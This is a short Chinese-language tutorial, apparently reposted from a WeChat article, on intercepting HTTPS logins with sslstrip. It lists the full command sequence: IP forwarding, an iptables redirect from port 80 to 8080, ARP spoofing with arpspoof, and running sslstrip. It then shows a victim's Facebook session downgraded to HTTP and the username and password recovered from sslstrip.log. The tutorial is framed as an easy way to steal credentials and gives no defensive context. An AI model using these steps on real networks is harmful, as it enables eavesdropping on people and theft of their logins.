# 利用sslstrip对HTTPS连接发起中间人攻击

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI0MDY1MDU4MQ==&mid=2247489901&idx=4&sn=2dc985dfd9fd43917c82d9b432061e56&chksm=e916c957de6140416592a16aa75f0ad3e6193375c847a6dcf7322bb0e18b71cf57a221c5a8bb&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247489901&idx=4&sn=2dc985dfd9fd43917c82d9b432061e56&chksm=e916c957de6140416592a16aa75f0ad3e6193375c847a6dcf7322bb0e18b71cf57a221c5a8bb&scene=27#wechat_redirect)

利用SSLStrip发起中间人攻击可以透明地劫持网络中的http流量，查找HTTPS链接并重定向，然后将这些链接映射到类似的HTTP链接中或者同形的HTTPS链接。  

它还支持提供类似锁定图标，选择性日志记录和拒绝会话的模式。

![](../Images/2f0f3c532753cca93336204e6e31e67f.png)step1

首先我们将设备设置为转发模式，这样我们的设备就可以转发目标不是我们设备的数据包。

 echo 1>/proc/sys/net/ipv4/ip\_forward

![](../Images/2f0f3c532753cca93336204e6e31e67f.png)step2

还需要设置iptables，将流量从80端口重定向到8080端口，确保出站连接发送到sslstrip中。

 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

![](../Images/2f0f3c532753cca93336204e6e31e67f.png)step3

需要找到我们的网关

 route -n

前三步如图所示

![](../Images/839ec33a771f4bf391063905ebecb619.png)

![](../Images/2f0f3c532753cca93336204e6e31e67f.png)step4

接下来我们需要找到目标主机的IP地址

![](../Images/deabd6e937b419995eda13aa8962cf6b.png)

![](../Images/15b455afcee67493c4af27eb6c7b05b3.png)step5

攻击者利用ARP欺骗技术将虚假的ARP消息发送到局域网中。  

 arpspoof -i -t

![](../Images/a0bf230122164d41b8426e58a811681a.png)

![](../Images/15b455afcee67493c4af27eb6c7b05b3.png)step6

现在我们打开一个新的终端并监听8080端口，命令如下  

 sslstrip -l 8080

![](../Images/32fb3b864781e1bfb5d9c127bd2c962a.png)

![](../Images/15b455afcee67493c4af27eb6c7b05b3.png)step7

现在我们转到受害主机中，并且在浏览器中输入facebook.com，我们知道Facebook本来是使用的HTTPS协议，但是这里我们看到与Facebook是通过http建立的连接。  

![](../Images/4f2c6979d87583361b3a0e88fa9c73c3.png)

![](../Images/15b455afcee67493c4af27eb6c7b05b3.png)step8

现在，返回到家目录，查看sslstrip.log日志文件，我们可以看到受害者登录时输入的用户名和密码，如图：  

![](../Images/3538da15a46fbe30653666275840eb72.png)

就是这么easy，我们就拿到了受害者的凭证。
